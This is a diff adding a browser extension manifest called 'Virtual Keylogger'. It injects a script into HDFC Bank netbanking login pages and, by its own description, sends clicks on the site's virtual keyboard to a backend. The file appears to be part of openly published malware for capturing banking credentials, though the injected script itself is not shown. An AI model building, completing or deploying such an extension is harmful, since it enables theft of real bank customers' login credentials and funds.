@@ -1,0 +1,19 @@
+{
+    "manifest_version": 3,
+    "name": "Virtual Keylogger",
+    "description": "Logs clicks on the virtual keyboard and sends them to the backend.",
+    "version": "0.0.1",
+    "author": "ayamdobhal",
+    "content_scripts": [
+        {
+            "matches": [
+                "https://netbanking.hdfcbank.com/netbanking/*",
+                "https://netportal.hdfcbank.com/nb-login/*"
+            ],
+            "js": [
+                "dist/main.js"
+            ]
+        }
+    ],
+    "homepage_url": "https://github.com/ayamdobhal/virtual-keylogger"
+}
